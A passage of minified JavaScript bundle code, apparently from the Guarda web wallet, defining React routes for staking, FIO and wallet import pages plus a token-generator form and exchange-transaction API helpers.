            exact: !0,
            path: "/app/extension/staking-bnb/unstaking",
            component: zG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-bnb/unstaking/confirm",
            component: $G
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-one",
            component: qG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-one/staking",
            component: qG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-one/staking/confirm",
            component: OneStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-one/unstaking/confirm",
            component: OneUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-one/claim/confirm",
            component: OneClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ada",
            component: DV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ada/staking",
            component: DV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ada/staking/confirm",
            component: AdaStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ada/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/airdrop-xrp/claim",
            component: BoardXrpSparkAirdropPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/airdrop-xrp/success",
            component: BoardSendSuccess
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-eos",
            component: GK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-eos/staking",
            component: GK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-eos/staking/confirm",
            component: KK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-eos/unstaking",
            component: YK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-eos/unstaking/confirm",
            component: XK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-atom",
            component: iK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-atom/staking",
            component: iK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-atom/staking/confirm",
            component: AtomStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-atom/unstaking/confirm",
            component: AtomUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-atom/claim/confirm",
            component: AtomClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx",
            component: iH
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/staking",
            component: iH
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/confirm",
            component: StakeConfirm_StakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/unstaking",
            component: TrxUnstake
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/delegate-resources",
            component: TrxDelegateResources
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/undelegate-resources",
            component: TrxUndelegateResources
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/delegate-resources/confirm",
            render: e => O.createElement(TrxConfirmResources, extension_board_extends({
                type: "delegate"
            }, e))
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/undelegate-resources/confirm",
            render: e => O.createElement(TrxConfirmResources, extension_board_extends({
                type: "undelegate"
            }, e))
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/unstaking/confirm",
            component: TrxUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-trx/withdraw/confirm",
            component: TrxWithdrawConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ont",
            component: UV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ont/staking",
            component: UV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ont/staking/confirm",
            component: StakeConfirm_StakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ont/unstaking",
            component: $V
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ont/unstaking/confirm",
            component: UnstakeConfirm_UnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ont/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-ont/redeem/confirm",
            component: QV
        }))
          , zne = undefined
          , extension_router = () => {
            const e = (0,
            $.v9)(oe.Yq)
              , t = (0,
            $.v9)(oe.Oj);
            return O.createElement(j.rs, null, !e && O.createElement(O.Fragment, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension",
                component: wY
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension/import",
                component: AppPageImport
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension/import-mnemonic",
                component: AppPageImport
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension/restore",
                component: AppPageImport
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension/set-password",
                component: set_password_AppPageSetPassword
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension/create",
                component: CreateWallets_CreateWallets
            })), e && !t && O.createElement(j.AW, {
                path: "/app/extension",
                component: enter_password_AppPageEnterPassword
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension/proceed",
                component: AppPagePayment
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension",
                component: extension_board
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/extension/:section/:fragment?/:params?/:otherparams?",
                component: extension_board
            }), O.createElement(j.AW, {
                component: _404
            }))
        }
          , extension_WebWalletsRouter = e => {
            const t = (0,
            $.I0)()
              , a = (0,
            $.v9)(oe.Oj)
              , n = (0,
            $.v9)($c);
            (0,
            O.useEffect)(( () => {
                async function initialize() {
                    try {
                        if (a && !n.length) {
                            const e = await t(restoreStorage());
                            t(restoreWallets(e.wallets))
                        }
                    } catch (e) {}
                }
                initialize()
            }
            ), []);
            return O.createElement("div", {
                className: Ht()(p5, "responsive")
            }, O.createElement("div", {
                className: f5
            }, O.createElement(extension_router, {
                locale: e.locale
            })))
        }
        ;
        extension_WebWalletsRouter.propTypes = {
            locale: as().string
        };
        const jne = extension_WebWalletsRouter;
        function mobile_board_extends() {
            mobile_board_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return mobile_board_extends.apply(this, arguments)
        }
        const $ne = undefined
          , mobile_board = () => O.createElement(j.rs, null, O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile",
            component: History_History
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/receive"
        }, O.createElement(DashboardMenu, null), O.createElement(DashboardWallets, null)), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/send",
            component: BoardSendPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/send/confirm",
            component: PM
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/send/success",
            component: BoardSendSuccess
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/exchange",
            component: ExchangeMainPage_ExchangeMainPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/exchange/details",
            component: ExchangeDetailsPage_ExchangeDetailsPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/history",
            component: History_History
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/settings",
            component: _ne
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-clo",
            component: yZ
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-clo/staking",
            component: yZ
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-clo/staking/confirm",
            component: StakingCloConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-xtz",
            component: StakingXtzIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-xtz/staking",
            component: StakingXtzIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-xtz/staking/confirm",
            component: XtzStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-bnb",
            component: OG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-bnb/staking",
            component: OG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-bnb/staking/confirm",
            component: MG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-bnb/unstaking",
            component: zG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-bnb/unstaking/confirm",
            component: $G
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-one",
            component: qG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-one/staking",
            component: qG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-one/staking/confirm",
            component: OneStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-one/unstaking/confirm",
            component: OneUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-one/claim/confirm",
            component: OneClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ada",
            component: DV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ada/staking",
            component: DV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ada/staking/confirm",
            component: AdaStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ada/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/airdrop-xrp/claim",
            component: BoardXrpSparkAirdropPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/airdrop-xrp/success",
            component: BoardSendSuccess
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-eos",
            component: GK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-eos/staking",
            component: GK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-eos/staking/confirm",
            component: KK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-eos/unstaking",
            component: YK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-eos/unstaking/confirm",
            component: XK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-atom",
            component: iK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-atom/staking",
            component: iK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-atom/staking/confirm",
            component: AtomStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-atom/unstaking/confirm",
            component: AtomUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-atom/claim/confirm",
            component: AtomClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx",
            component: iH
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/staking",
            component: iH
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/confirm",
            component: StakeConfirm_StakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/unstaking",
            component: TrxUnstake
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/delegate-resources",
            component: TrxDelegateResources
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/undelegate-resources",
            component: TrxUndelegateResources
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/delegate-resources/confirm",
            render: e => O.createElement(TrxConfirmResources, mobile_board_extends({
                type: "delegate"
            }, e))
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/undelegate-resources/confirm",
            render: e => O.createElement(TrxConfirmResources, mobile_board_extends({
                type: "undelegate"
            }, e))
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/unstaking/confirm",
            component: TrxUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-trx/withdraw/confirm",
            component: TrxWithdrawConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ont",
            component: UV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ont/staking",
            component: UV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ont/staking/confirm",
            component: StakeConfirm_StakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ont/unstaking",
            component: $V
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ont/unstaking/confirm",
            component: UnstakeConfirm_UnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ont/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/staking-ont/redeem/confirm",
            component: QV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/success",
            component: BoardSendSuccess
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/select-wallets",
            component: fio_select_wallets_BoardSendConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/invoice-approve",
            component: FioInvoiceApprovePage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/invoice-approve/confirm",
            component: FioApproveInvoiceConfirmPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/invoice-create",
            component: BoardFioRequestPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/invoice-create/confirm",
            component: confirm_BoardSendConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/register-address",
            component: nj
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/payment",
            component: FioPaymentAddress
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/mobile/fio/manage",
            component: FioRegisterAddress
        }))
          , Zne = undefined
          , mobile_router = () => {
            const e = (0,
            $.v9)(oe.Yq)
              , t = (0,
            $.v9)(oe.Oj);
            return O.createElement(j.rs, null, !e && O.createElement(O.Fragment, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/mobile",
                component: wY
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/mobile/import",
                component: AppPageImport
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/mobile/import-mnemonic",
                component: AppPageImport
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/mobile/restore",
                component: AppPageImport
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/mobile/set-password",
                component: set_password_AppPageSetPassword
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/mobile/create",
                component: CreateWallets_CreateWallets
            })), e && !t && O.createElement(j.AW, {
                path: "/app/mobile",
                component: AppPageEnterPassword
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/mobile",
                component: mobile_board
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/mobile/:section/:fragment?/:params?/:otherparams?",
                component: mobile_board
            }), O.createElement(j.AW, {
                component: _404
            }))
        }
          , mobile_WebWalletsRouter = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(oe.Oj)
              , a = (0,
            $.v9)($c);
            (0,
            O.useEffect)(( () => {
                async function initialize() {
                    try {
                        if (t && !a.length) {
                            const t = await e(restoreStorage());
                            t && e(restoreWallets(t.wallets))
                        }
                    } catch (e) {}
                }
                initialize()
            }
            ), []);
            return O.createElement("div", {
                className: Ht()(p5, "responsive")
            }, O.createElement("div", {
                className: f5
            }, O.createElement(mobile_router, null)))
        }
          , Yne = mobile_WebWalletsRouter
          , qne = undefined
          , components_header = () => O.createElement("div", {
            className: pk
        }, O.createElement("div", {
            className: "container"
        }, O.createElement("div", {
            className: fk
        }, O.createElement("div", {
            className: yk
        }, O.createElement(Y.OL, {
            to: "/app",
            className: Ek
        }, O.createElement("img", {
            width: "40",
            height: "46",
            src: Fk,
            alt: "Guarda web wallets"
        })), O.createElement("span", {
            className: Ht()(bk, vk)
        }, "Token Generator"), O.createElement($P, {
            href: "https://support.guarda.com/getting-started/creating-your-token"
        }, "How it works")), O.createElement("nav", {
            className: Ht()(gk)
        }, O.createElement(zk, null), O.createElement(back_to_guarda, null)))))
          , Xne = "token-generator_pageBackground_19war app_pageBackground_2Jmxb"
          , Qne = "token-generator_wrapper_HZZUw"
          , Jne = "token-generator_backButton_xy7mk";
        class Config {
            static getSupportedToken(e) {
                if (void 0 === e) {
                    const e = undefined;
                    return Array.from(OW.entries()).map((e => {
                        let[t,a] = e;
                        return {
                            ...a,
                            id: t
                        }
                    }
                    ))
                }
                const t = OW.get(e);
                if (!t)
                    throw Error("Token type is unsupported");
                return t
            }
            static getServiceFee(e) {
                return M.CM ? FW.get(e) : WW.get(e)
            }
            static getSupportedWallets(e) {
                if (!e)
                    throw Error("Token type is unsupported");
                return M.CM ? RW.get(e) : BW.get(e)
            }
        }
        const ere = Config
          , tre = "set-name-carousel_container_aGdE6"
          , are = "set-name-carousel_wrapper_1u_SZ"
          , nre = "set-name-carousel_slide_3AYPF"
          , rre = "set-name-carousel_arrowLeft_4RpUB"
          , lre = "set-name-carousel_arrowRight_1OFYS"
          , sre = a.p + "assets/images/3Fl_Mxp.jpg"
          , ire = a.p + "assets/images/fJPGSAo.png"
          , ore = a.p + "assets/images/3af-eBe.jpg"
          , cre = a.p + "assets/images/32PMyC7.jpg";
        function set_name_carousel_extends() {
            set_name_carousel_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return set_name_carousel_extends.apply(this, arguments)
        }
        const ure = [e => O.createElement("div", set_name_carousel_extends({
            className: nre
        }, e, {
            key: "slide1"
        }), O.createElement("img", {
            alt: "",
            className: nre,
            src: sre
        })), e => O.createElement("div", set_name_carousel_extends({
            className: nre
        }, e, {
            key: "slide2"
        }), O.createElement("img", {
            alt: "",
            className: nre,
            src: ire
        })), e => O.createElement("div", set_name_carousel_extends({
            className: nre
        }, e, {
            key: "slide3"
        }), O.createElement("img", {
            alt: "",
            className: nre,
            src: ore
        })), e => O.createElement("div", set_name_carousel_extends({
            className: nre
        }, e, {
            key: "slide4"
        }), O.createElement("img", {
            alt: "",
            className: nre,
            src: cre
        }))]
          , SetNameCarousel = () => {
            const [e,t] = (0,
            O.useState)(0)
              , handleRight = () => t(Math.min(e + 1, ure.length - 1))
              , handleLeft = () => t(Math.max(e - 1, 0));
            return O.createElement("div", {
                className: tre
            }, O.createElement("div", {
                className: rre,
                onClick: handleLeft
            }), O.createElement("div", {
                className: lre,
                onClick: handleRight
            }), O.createElement("div", {
                className: are
            }, ure.map(( (t, a) => t({
                style: {
                    marginLeft: 0 === a ? `-${100 * e}%` : "0"
                }
            })))))
        }
          , dre = SetNameCarousel
          , mre = "stepper_stepper_1A_qc"
          , pre = "stepper_wrapper_pZfRp"
          , fre = "stepper_line_1wqLs"
          , Ere = "stepper_title_3bH26"
          , hre = "stepper_isActive_2KAqy"
          , gre = "stepper_circle_3MadH"
          , stepper = e => {
            let {step: t} = e;
            const getClass = e => Ht()(gre, {
                [hre]: e <= t
            })
              , renderTitle = (e, a) => O.createElement("h3", {
                className: Ht()(Ere, {
                    [hre]: a <= t
                })
            }, e);
            return O.createElement("div", null, O.createElement("div", {
                className: "col-xs-4 col-xs-offset-4"
            }, O.createElement("div", {
                className: mre
            }, O.createElement("div", {
                className: pre
            }, renderTitle("Name", 1), O.createElement("div", {
                className: getClass(1)
            })), O.createElement("div", {
                className: pre
            }, renderTitle("Supply", 2), O.createElement("div", {
                className: getClass(2)
            })), O.createElement("div", {
                className: pre
            }, renderTitle("Payment", 3), O.createElement("div", {
                className: getClass(3)
            })), O.createElement("div", {
                className: pre
            }, renderTitle("Deploy", 4), O.createElement("div", {
                className: getClass(4)
            })), O.createElement("div", {
                className: fre
            }))))
        }
          , yre = "set-name_headingWrapper_1DDnd"
          , vre = "set-name_truncate_3eM1O"
          , _re = "set-name_confirmBlock_3eekh"
          , wre = "set-name_block_1iVuk"
          , bre = "set-name_titleSlider_1qHjK"
          , kre = "set-name_backButton_LYaGx pages_backButton_2UZP6"
          , Sre = /[^\p{L}\p{N}\p{P}\p{Z}^$\n]/gu
          , hasEmoji = e => {
            const t = e.replace(Sre, "");
            return e.length !== t.length
        }
          , Cre = new Map([[LW.eth_erc20, {
            name: {
                validate: e => e ? !(e.length > 30) || "No more than 30 symbols" : "Title cannot be empty"
            },
            symbol: {
                validate: e => e ? !(e.length > 5 || e.length < 3) || "Use 3 to 5 symbols" : "Symbol cannot be empty"
            },
            type: {
                required: "Network cannot be empty"
            }
        }], [LW.hbar_hbar, {
            name: {
                validate: e => e ? e.length > 100 ? "No more than 100 symbols" : !hasEmoji(e) || "Emoji doesn't support" : "Title cannot be empty"
            },
            symbol: {
                validate: e => e ? e.length > 100 ? "No more than 100 symbols" : !hasEmoji(e) || "Emoji doesn't support" : "Symbol cannot be empty"
            },
            type: {
                required: "Network cannot be empty"
            }
        }]])
          , Form = e => {
            const {defaultValues: t, supportTokens: a, onSubmit: n} = e
              , {control: r, watch: l, handleSubmit: s, clearErrors: i} = (0,
            C$.cI)({
                defaultValues: t,
                reValidateMode: "onChange"
            })
              , o = (0,
            O.useCallback)((e => t => {
                const {symbol: a, type: n, name: r} = t
                  , l = {
                    symbol: null == a ? void 0 : a.toUpperCase(),
                    tokenType: n,
                    name: r
                };
                return e(l)
            }
            ), [])
              , c = l("name")
              , u = l("type");
            (0,
            O.useEffect)(( () => i(["name", "symbol"])), [i, u]);
            const d = (0,
            O.useMemo)(( () => u ? Cre.get(u) : Cre.get(LW.eth_erc20)), [u]);
            return O.createElement("form", {
                onSubmit: s(o(n))
            }, O.createElement("div", {
                className: "col-xs-12"
            }, (0,
            M.d)() && O.createElement(BackButton, {
                className: kre
            }), O.createElement("div", {
                className: yre
            }, c ? O.createElement(O.Fragment, null, O.createElement("span", {
                className: vre
            }, c), " ", "token") : "Name your token")), O.createElement("div", {
                className: Ht()(wre, "col-xs-4")
            }, O.createElement("p", null, "Choose a network"), O.createElement(C$.Qr, {
                name: "type",
                control: r,
                rules: {
                    required: "Network cannot be empty"
                },
                render: e => {
                    var t;
                    let {field: n, fieldState: r} = e;
                    return O.createElement(pa, {
                        isInvalid: r.isTouched && !r.invalid,
                        message: null == r || null === (t = r.error) || void 0 === t ? void 0 : t.message
                    }, O.createElement(Lp, {
                        hasSearch: !1,
                        placeholder: "Network",
                        emptyPlaceholder: "Network",
                        onChange: e => n.onChange(e.id),
                        selected: a.find((e => e.id === n.value)),
                        items: a
                    }))
                }
            }), O.createElement("p", null, "Link it to your company’s name or service"), O.createElement(C$.Qr, {
                name: "name",
                control: r,
                rules: null == d ? void 0 : d.name,
                render: e => {
                    var t;
                    let {field: {value: a, name: n, ref: r, onChange: l, onBlur: s}, fieldState: i} = e;
                    return O.createElement(pa, {
                        isInvalid: i.invalid,
                        message: null == i || null === (t = i.error) || void 0 === t ? void 0 : t.message
                    }, O.createElement(Ea, {
                        autoFocus: !0,
                        placeholder: "Token Name",
                        value: a || "",
                        name: n,
                        onChange: l,
                        onBlur: s,
                        ref: r
                    }))
                }
            }), O.createElement("p", null, "The short name will appear on the exchanges as your token gets listed"), O.createElement(C$.Qr, {
                name: "symbol",
                control: r,
                rules: null == d ? void 0 : d.symbol,
                render: e => {
                    var t;
                    let {field: {value: a, name: n, ref: r, onChange: l, onBlur: s}, fieldState: i} = e;
                    return O.createElement(pa, {
                        isInvalid: i.invalid,
                        message: null == i || null === (t = i.error) || void 0 === t ? void 0 : t.message
                    }, O.createElement(Ea, {
                        placeholder: "Token Symbol",
                        value: a || "",
                        name: n,
                        onChange: l,
                        onBlur: s,
                        ref: r
                    }))
                }
            }), O.createElement("div", {
                className: _re
            }, O.createElement(Yl, {
                color: "blue",
                size: "large",
                type: "submit"
            }, "Continue"), O.createElement("span", null, "Name cannot be changed after you publish a token "))))
        }
          , Nre = Form
          , Tre = ee.P.create({
            name: "reducer-exchanges"
        })
          , Are = {}
          , xre = []
          , Ire = "tokenGeneratorExchanges"
          , Pre = (0,
        Ru.Z)({
            CLEAR_ALL_DATA: () => ({
                ...Are
            })
        }, Are)
          , selectedPartner = e => e[Ire].partner || "changenow"
          , createExchangeTransaction = e => async t => {
            const a = await t(getSecureData("uuid"));
            a && Object.assign(e, {
                uuid: a
            });
            try {
                const {data: t} = await U.nW.post("/api/v1/exchange/v2/create-transaction", e, {
                    timeout: 3e4
                });
                if (!t || !t.transaction || !t.transaction.payinAddress)
                    throw new Error(`Failed create exchange transaction: ${JSON.stringify(t)}`);
                return t.transaction
            } catch (t) {
                ge.b.error(ge.d.CANT_CREATE_EXCHANGE_TX_BY_API, {
                    currency: e.fromCurrency
                }, t, e);
                return {}
            }
        }
          , getAvailableCurrencies = e => {
            let {currency: t, partner: a} = e;
            return async () => {
                try {
                    const {data: e} = await U.nW.get(`/api/v1/exchange/get-available-currencies/${t.toLowerCase()}`, {
                        params: {
                            partner: a
                        }
                    });
                    return e.currencies
                } catch (e) {
                    Tre.error("getAvailableCurrencies reducer failed", e);
                    return []
                }
            }
        }
          , getExchangeTransaction = e => {
            let {id: t, partner: a} = e;
            return async () => {
                try {
                    const {data: e} = await U.nW.get(`/api/v1/exchange/v2/get-transaction/${t}`, {
                        params: {
                            partner: a
                        }
                    }, {
                        timeout: 2e4
                    });
                    return e.transaction
                } catch (e) {
                    Tre.error("getExchangeTransaction reducer failed", e);
                    return {}
                }
            }
        }
          , Lre = {
            creationData: null
        }
          , Fre = "token-generator-v2"
          , selectCreationData = e => e["token-generator-v2"].creationData
          , Wre = (0,
        te.createAction)("@token-generator/SET_CREATION_DATA")()
          , restoreCreationData = () => async (e, t) => {
            var a;
            const n = await e(getSecureData(je));
            if (!n)
                return;
            const r = t()
              , l = eu(r)
              , s = null === (a = l(null == n ? void 0 : n.wallet)) || void 0 === a ? void 0 : a.data;
            if (!s)
                return;
            let i;
            if (n.exchange) {
                var o, c;
                const e = null === (o = l(n.exchange.fromWallet)) || void 0 === o ? void 0 : o.data
                  , t = null === (c = l(n.exchange.toWallet)) || void 0 === c ? void 0 : c.data;
                e && t && (i = {
                    fromWallet: e,
                    toWallet: t
                })
            }
            const u = {
                ...n,
                exchange: i,
                wallet: s
            };
            e(Wre(u));
            return u
        }
          , token_generator_getFiatAmount = e => (t, a, n) => {
            if (!a)
                return;
            if (a.currency === n)
                return t;
            if ("0" === String(t))
                return "0";
            const r = (0,
            Cd.w)(e, a);
            return r ? (0,
            Ko.$q)(t, String(r.rates[n])).toString() : void 0
        }
          , getWalletsByTickers = (e, t) => {
            const a = undefined;
            return $c(e).filter((e => t.includes(e.data.currency)))
        }
          , Rre = (0,
        _t.P1)([getWalletsByTickers, kd.Y2], ( (e, t) => {
            const a = token_generator_getFiatAmount(t);
            return e.map((e => {
                const t = e.balance
                  , n = null == e ? void 0 : e.mapToPlainObject();
                let r = n;
                switch (null == e ? void 0 : e.currency) {
                case "ropsten":
                    r = {
                        ...n,
                        family: "eth",
                        currency: "eth"
                    };
                    break;
                case "hbar-testnet":
                    r = {
                        ...n,
                        family: "hbar",
                        currency: "hbar"
                    }
                }
                return Object.assign(n, {
                    fiatAmount: a(n.balance, r, "usd"),
                    availableFiatAmount: a(t, r, "usd")
                })
            }
            ))
        }
        ))
          , getSupportPaymentWallets = e => {
            let {currency: t, partner: a="changenow"} = e;
            return async (e, n) => {
                const r = await e(getAvailableCurrencies({
                    currency: t,
                    partner: a
                }));
                let l = [];
                null != r && r.error || (l = (r || []).map((e => {
                    let {ticker: t} = e;
                    return t
                }
                )));
                const s = n()
                  , i = undefined;
                return Rre(s, l.concat([t]))
            }
        }
          , Bre = (0,
        te.createReducer)(Lre).handleAction(Wre, ( (e, t) => {
            let {payload: a} = t;
            return {
                ...e,
                creationData: a
            }
        }
        ))
          , Ore = "create-wallet-block_centerContainer_1uaNx"
          , Dre = "create-wallet-block_whiteBlock_1UrSc"
          , Mre = "create-wallet-block_grayBlock_3GskT"
          , Ure = "create-wallet-block_button_W8PXP"
          , create_wallet_block = () => O.createElement("div", {
            className: Ore
        }, O.createElement("div", {
            className: Dre
